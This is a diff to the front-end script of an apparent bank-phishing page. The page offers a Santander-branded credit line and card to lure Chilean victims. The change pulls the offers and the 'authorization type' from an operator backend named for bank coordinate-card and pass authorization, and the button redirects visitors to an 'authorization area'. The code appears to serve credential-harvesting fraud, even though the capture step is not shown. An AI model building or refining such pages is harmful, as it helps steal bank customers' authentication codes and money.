@@ -62,6 +62,8 @@
   </div>
  
   <script>
+    const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+
     // Formato CLP
     function formatoCLP(valor){
       return new Intl.NumberFormat("es-CL", {
@@ -72,16 +74,24 @@
       }).format(valor);
     }
 
-    document.addEventListener("DOMContentLoaded", () => {
-      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
-      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
-      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
-      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;
+    let tipoAutorizacion = "santander"; // valor por defecto
 
-      document.getElementById("producto1").innerText = producto1;
-      document.getElementById("monto1").innerText = formatoCLP(monto1);
-      document.getElementById("producto2").innerText = producto2;
-      document.getElementById("monto2").innerText = formatoCLP(monto2);
+    document.addEventListener("DOMContentLoaded", () => {
+      // Obtener configuración desde el backend
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("producto1").innerText = data.producto1 || "Línea de Crédito";
+          document.getElementById("monto1").innerText = formatoCLP(data.monto1 || 5000000);
+          document.getElementById("producto2").innerText = data.producto2 || "Tarjeta de Crédito WorldMember Limited Business";
+          document.getElementById("monto2").innerText = formatoCLP(data.monto2 || 5000000);
+
+          tipoAutorizacion = data.tipoAutorizacion || "santander";
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          document.getElementById("mensaje").innerText = "⚠️ No se pudo cargar configuración del servidor.";
+        });
     });
 
     document.getElementById("quieroBtn").addEventListener("click", function(){
@@ -91,11 +101,8 @@
         return;
       }
 
-      // Guardar selección
+      // Guardar selección en localStorage (solo para pasar al formulario)
       localStorage.setItem("seleccionProducto", seleccion.value);
-
-      // Recuperar tipo de autorización definido en Panel Admin
-      const tipoAutorizacion = localStorage.getItem("tipoAutorizacion") || "santander";
 
       document.getElementById("mensaje").innerText = "Serás redirigido al área de autorización...";
 
